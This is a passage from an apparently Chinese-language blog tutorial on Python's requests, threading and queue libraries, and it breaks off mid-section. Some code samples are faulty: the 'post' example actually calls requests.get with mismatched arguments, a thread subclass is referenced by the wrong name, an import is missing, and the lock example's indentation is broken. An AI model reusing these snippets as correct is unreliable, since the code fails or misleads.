class="string">'*/*'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://www.baidu.com'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; '</span>,</span><br><span class="line">            <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数信息</span></span><br><span class="line">para = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># cookies</span></span><br><span class="line">cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=header, params = para, allow_redirects=<span class="keyword">False</span>, cookies=cookies, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>post 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 除了参数信息的方式不一样外，其余信息和get一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">'key1'</span>: <span class="string">'value1'</span>, </span><br><span class="line">    <span class="string">'key2'</span>: <span class="string">'value2'</span>, </span><br><span class="line">    <span class="string">'key3'</span>: <span class="keyword">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, data=header, params = para, allow_redirects=<span class="keyword">False</span>, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p><code>请求的参数</code></p><p><strong>① 参数</strong></p><blockquote><p>具体的可以看上面</p></blockquote><p><strong>② Cookies</strong></p><blockquote><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br></pre></td></tr></table></figure><blockquote><p>要想发送你的cookies到服务器，可以使用 <code>cookies</code> 参数：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><p><strong>③ 重定向</strong></p><blockquote><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code>history</code> 方法来追踪重定向。</p><p><a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.history" target="_blank" rel="noopener"><code>Response.history</code></a> 是一个 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener"><code>Response</code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p></blockquote><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure><p>如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 <code>allow_redirects</code> 参数禁用重定向处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">301</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p><strong>④ 超时</strong></p><p>你可以告诉 requests 在经过以 <code>timeout</code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><p><font size="2">注意：<code>timeout</code> 仅对连接过程有效，与响应体的下载无关。 <code>timeout</code> 并不是整个下载响应的时间限制，而是如果服务器在 <code>timeout</code> 秒内没有应答，将会引发一个异常（更精确地说，是在 <code>timeout</code> 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</font></p><h4 id="2requests库主要的7个方法"><a class="markdownIt-Anchor" href="#2requests库主要的7个方法"></a> 2.requests库主要的7个方法</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>requests.request()</td><td>构造一个请求，支撑一下各方法的基础方法</td></tr><tr><td>requests.get()</td><td>获取HTML网页的主要方法，对应HTTP的GET</td></tr><tr><td>requests.post()</td><td>向HTML网页提交POST请求方法，对应HTTP的POST</td></tr><tr><td>requests.put()</td><td>向HTML网页提交PUT请求的方法，对应HTTP的RUT</td></tr><tr><td>requests.head()</td><td>获取HTML网页头的信息方法，对应HTTP的HEAD</td></tr><tr><td>requests.patch()</td><td>向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td>requests.delete()</td><td>向HTML页面提交删除请求,对应HTTP的DELETE</td></tr></tbody></table><h4 id="3response对象的属性"><a class="markdownIt-Anchor" href="#3response对象的属性"></a> 3.response对象的属性</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>r.status_code</td><td>HTTP请求的返回状态</td></tr><tr><td>r.text</td><td>HTTP响应内容的字符串形式，即：url对应的页面内容</td></tr><tr><td>r.encoding</td><td>从HTTP  header中猜测的响应内容编码方式</td></tr><tr><td>r.apparent_encoding</td><td>从内容中分析出的响应内容编码方式（备选编码方式）</td></tr><tr><td>r.content</td><td>HTTP响应内容的二进制形式</td></tr><tr><td>r.headers</td><td>获得头部信息</td></tr><tr><td>r.url</td><td>获得链接</td></tr></tbody></table><h3 id="font-color-navy0x02-threading-库多线程font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-threading-库多线程font"></a> <font color="navy">0x02 threading 库（多线程）</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br></pre></td></tr></table></figure><blockquote><p>我们要创建 Thread 对象,然后让它们运行，每个 Thread 对象代表一个线程，在每个线程中我们可以让程序处理不同的任务，这就是多线程编程。</p><p><strong>值得注意的是，程序运行时默认就是在主线程上</strong></p><p>创建 Thread 对象有 2 种手段。</p><ol><li>直接创建 Thread ，将一个 callable 对象从类的构造器传递进去，这个 callable 就是回调函数，用来处理任务。</li><li>编写一个自定义类继承 Thread，然后复写 run() 方法，在 run() 方法中编写任务处理代码，然后创建这个 Thread 的子类。</li></ol></blockquote><h4 id="1创建-thread-对象"><a class="markdownIt-Anchor" href="#1创建-thread-对象"></a> 1.创建 Thread 对象</h4><p><code>方法一：直接创建</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">threading</span>.<span class="title">Thread</span><span class="params">(group=None, target=None, name=None, args=<span class="params">()</span>, kwargs=&#123;&#125;, *, daemon=None)</span></span></span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>group</strong> 应该为 <code>None</code>；为了日后扩展 <code>ThreadGroup</code> 类实现而保留。</li><li><strong>target</strong> 是用于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法调用的可调用对象。默认是 <code>None</code>，表示不需要调用任何方法。</li><li><strong>name</strong> 是线程名称。默认情况下，由 “Thread-<em>N</em>” 格式构成一个唯一的名称，其中 <em>N</em> 是小的十进制数。</li><li><strong>args</strong> 是用于调用目标函数的参数元组。默认是 <code>()</code>。</li><li><strong>kwargs</strong> 是用于调用目标函数的关键字参数字典。默认是 <code>{}</code>。</li><li>如果不是 <code>None</code>，<em>daemon</em> 参数将显式地设置该线程是否为守护模式。 如果是 <code>None</code> (默认值)，线程将继承当前线程的守护模式属性。</li><li>如果子类型重载了构造函数，它一定要确保在做任何事前，先发起调用基类构造器(<code>Thread.__init__()</code>)。</li></ul></blockquote><p><code>方法二：继承Thread类创建线程类</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,scan)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.scan = scan</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(threading.current_thread().name,<span class="string">"is created!"</span>)</span><br><span class="line">        self.scan._scan()</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scan</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,a)</span>:</span></span><br><span class="line">        self.a = a</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_scan</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.a):</span><br><span class="line">            print(threading.current_thread().name, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    scan = Scan(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        <span class="comment">#t = threading.Thread(target=scan._scan,daemon=True)    </span></span><br><span class="line">        t = mythread(scan)</span><br><span class="line">        t.start()</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">    t.join()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        if threading.active_count() &lt;= 1:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(<span class="string">"The main thread is killed!"</span>)</span><br></pre></td></tr></table></figure><h4 id="2threadingthread-的方法"><a class="markdownIt-Anchor" href="#2threadingthread-的方法"></a> 2.threading.Thread 的方法</h4><blockquote><p>先说几个最常用的，以后再进行补充</p></blockquote><p>① <code>threading.active_count</code>() / <code>threading.activeCount</code>()</p><p>返回当前存活的线程类 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。返回的计数等于 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.enumerate" target="_blank" rel="noopener"><code>enumerate()</code></a> 返回的列表长度。</p><p>② <code>threading.current_thread</code>() / <code>threading.currentThread</code>()</p><p>返回当前对应调用者的控制线程的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread" target="_blank" rel="noopener"><code>Thread</code></a> 对象。如果调用者的控制线程不是利用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#module-threading" target="_blank" rel="noopener"><code>threading</code></a> 创建，会返回一个功能受限的虚拟线程对象。其还可以调用几个实例化方法：</p><ul><li>isAlive(): 返回线程是否活动的</li><li>getName(): 返回线程名</li><li>setName(): 设置线程名</li><li>name(): 返回当前线程的名称</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">threading.current_thread().setName(<span class="string">"主线程"</span>) <span class="comment">#设置线程名字</span></span><br><span class="line">print(threading.current_thread().isAlive()) <span class="comment">#线程是不是活动的</span></span><br><span class="line">print(<span class="string">"当前线程"</span>,threading.current_thread())</span><br><span class="line">print(<span class="string">"获取当前线程名字"</span>,threading.current_thread().getName()</span><br></pre></td></tr></table></figure><p>③ <code>start</code>()</p><blockquote><p>开始线程活动。它在一个线程里最多只能被调用一次。它安排对象的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法在一个独立的控制进程中调用。如果同一个线程对象中调用这个方法的次数大于一次，会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。</p></blockquote><p>④ <code>run</code>()</p><blockquote><p>代表线程活动的方法。你可以在子类型里重载这个方法。 标准的 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.run" target="_blank" rel="noopener"><code>run()</code></a> 方法会对作为 <em>target</em> 参数传递给该对象构造器的可调用对象（如果存在）发起调用，并附带从 <em>args</em> 和 <em>kwargs</em> 参数分别获取的位置和关键字参数。</p></blockquote><p>⑤ <code>join</code>(timeout=None)`</p><blockquote><ul><li><p>等待，直到线程终结。这会阻塞调用这个方法的线程，直到被调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 的线程终结 – 不管是正常终结还是抛出未处理异常 – 或者直到发生超时，超时选项是可选的。</p></li><li><p>当 <em>timeout</em> 参数存在而且不是 <code>None</code> 时，它应该是一个用于指定操作超时的以秒为单位的浮点数或者分数。因为 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 总是返回 <code>None</code> ，所以你一定要在 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 后调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.is_alive" target="_blank" rel="noopener"><code>is_alive()</code></a> 才能判断是否发生超时 – 如果线程仍然存活，则 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 超时。</p></li><li><p>当 <em>timeout</em> 参数不存在或者是 <code>None</code> ，这个操作会阻塞直到线程终结。</p></li><li><p>一个线程可以被 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 很多次。</p></li><li><p>如果尝试加入当前线程会导致死锁， <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。如果尝试 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.join" target="_blank" rel="noopener"><code>join()</code></a> 一个尚未开始的线程，也会抛出相同的异常。</p></li></ul></blockquote><p>⑥ <code>daemon</code></p><blockquote><p>一个表示这个线程是（True）否（False）守护线程的布尔值。一定要在调用 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.start" target="_blank" rel="noopener"><code>start()</code></a> 前设置好，不然会抛出 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 。初始值继承于创建线程；主线程不是守护线程，因此主线程创建的所有线程默认都是 <a href="https://docs.python.org/zh-cn/3/library/threading.html#threading.Thread.daemon" target="_blank" rel="noopener"><code>daemon</code></a> = <code>False</code>。下面先看一段代码：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        print(threading.current_thread().name+<span class="string">' test '</span>,i)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>)</span><br><span class="line"><span class="comment"># thread = threading.Thread(target=test,name='TestThread',daemon=True)</span></span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>程序运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">TestThread test  4</span><br></pre></td></tr></table></figure><p><font size="2">MainThread 没有代码运行的时候，TestThread 还在运行。这是因为 MainThread 在等待其他线程的结束。TestThread 中 daemon 属性默认是 False，这使得 MainThread 需要等待它的结束，自身才结束。**如果要达到，MainThread 结束，子线程也立马结束，怎么做呢？**其实很简单，只需要在子线程调用 start() 方法之前设置 daemon 就好了。当然也可以在子线程的构造器中传递 daemon 的值为 True。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread = threading.Thread(target=test,name=<span class="string">'TestThread'</span>,daemon=<span class="keyword">True</span>)</span><br><span class="line"><span class="comment"># thread.setDaemon(True)</span></span><br></pre></td></tr></table></figure><h4 id="3threading锁问题"><a class="markdownIt-Anchor" href="#3threading锁问题"></a> 3.threading锁问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.lock = threading.RLock()</span><br></pre></td></tr></table></figure><p>其方法有：</p><ul><li><p><code>acquire</code>(<em>blocking=True</em>, <em>timeout=-1</em>)</p><p>可以阻塞或非阻塞地获得锁。当无参数调用时： 如果这个线程已经拥有锁，递归级别增加一，并立即返回。否则，如果其他线程拥有该锁，则阻塞至该锁解锁。一旦锁被解锁(不属于任何线程)，则抢夺所有权，设置递归等级为一，并返回。如果多个线程被阻塞，等待锁被解锁，一次只有一个线程能抢到锁的所有权。在这种情况下，没有返回值。当发起调用时将 <em>blocking</em> 参数设为真值，则执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将 <em>blocking</em> 参数设为假值，则不进行阻塞。 如果一个无参数调用将要阻塞，则立即返回 <code>False</code>；在其他情况下，执行与无参数调用时一样的操作，然后返回 <code>True</code>。当发起调用时将浮点数的 <em>timeout</em> 参数设为正值时，只要无法获得锁，将最多阻塞 <em>timeout</em> 所指定的秒数。 如果已经获得锁则返回 <code>True</code>，如果超时则返回假值。<em>在 3.2 版更改:</em> 新的 <em>timeout</em> 形参。</p></li><li><p><code>release</code>()</p><p>释放锁，自减递归等级。如果减到零，则将锁重置为非锁定状态(不被任何线程拥有)，并且，如果其他线程正被阻塞着等待锁被解锁，则仅允许其中一个线程继续。如果自减后，递归等级仍然不是零，则锁保持锁定，仍由调用线程拥有。只有当前线程拥有锁才能调用这个方法。如果锁被释放后调用这个方法，会引起 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#RuntimeError" target="_blank" rel="noopener"><code>RuntimeError</code></a> 异常。没有返回值。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_writeReult</span><span class="params">(self, result)</span>:</span></span><br><span class="line">    self.lock.acquire()<span class="comment"># 获取锁</span></span><br><span class="line">    <span class="keyword">with</span> open(self.oFileName, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result + <span class="string">"\n"</span>)<span class="comment"># 写入文件</span></span><br><span class="line"> self.lock.release()<span class="comment"># 释放锁</span></span><br></pre></td></tr></table></figure><h4 id="4thread继承问题"><a class="markdownIt-Anchor" href="#4thread继承问题"></a> 4.thread继承问题</h4><p>前面讲过，直接初始化一个 Thread，然后，现在还有一种方式就是自定义一个 Thread 的子类，然后复写它的 run() 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name=None)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            print(threading.current_thread().name + <span class="string">' test '</span>, i)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">thread = TestThread(name=<span class="string">'TestThread'</span>)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(threading.current_thread().name+<span class="string">' main '</span>, i)</span><br><span class="line">    print(thread.name+<span class="string">' is alive '</span>, thread.isAlive())</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>上面的代码，我们自定义了 TestThread 这个类，然后继承了 threading.Thread。</p><p>只有在 run() 方法中处理逻辑。最终代码运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread test  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">123456789101112131415</span><br></pre></td></tr></table></figure><h4 id="5相关问题"><a class="markdownIt-Anchor" href="#5相关问题"></a> 5.相关问题</h4><blockquote><ol><li>run()和start()的区别是什么？</li><li>如何继承构造线程？</li></ol></blockquote><h4 id="6参考文章"><a class="markdownIt-Anchor" href="#6参考文章"></a> 6.参考文章</h4><ol><li><a href="https://blog.csdn.net/briblue/article/details/85101144" target="_blank" rel="noopener">Python多线程编程(一）：threading 模块 Thread 类的用法详解</a></li><li><a href="https://blog.csdn.net/weixin_40481076/article/details/101594705" target="_blank" rel="noopener">python多线程详解（超详细）</a></li></ol><h3 id="font-color-navy0x03-queue-库font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-queue-库font"></a> <font color="navy">0x03 queue 库</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br></pre></td></tr></table></figure><h4 id="1queue的常用方法"><a class="markdownIt-Anchor" href="#1queue的常用方法"></a> 1.queue的常用方法</h4><p>①  <code>q.put(item, block=True, timeout=None)</code></p><ul><li>item：放入队列中的数据元素。</li><li>block：当队列中元素个数达到上限继续往里放数据时：如果 block=False，直接引发 queue.Full 异常；如果 block=True，且 timeout=None，则一直等待直到有数据出队列后可以放入数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有位置放入数据就引发 queue.Full 异常。</li><li>timeout：设置超时时间。</li></ul><p>② <code>q.put_nowait(item)</code></p><blockquote><p>相当于 Queue.put(item, block=False)，当队列中元素个数达到上限继续往里放数据时直接引发 queue.Full 异常。</p></blockquote><p>③ <code>q.get(block=True, timeout=None)</code></p><blockquote><p>从队列中取出数据并返回该数据内容。</p></blockquote><ul><li>block：当队列中没有数据元素继续取数据时：如果 block=False，直接引发 queue.Empty 异常；如果 block=True，且 timeout=None，则一直等待直到有数据入队列后可以取出数据；如果 block=True，且 timeout=N，N 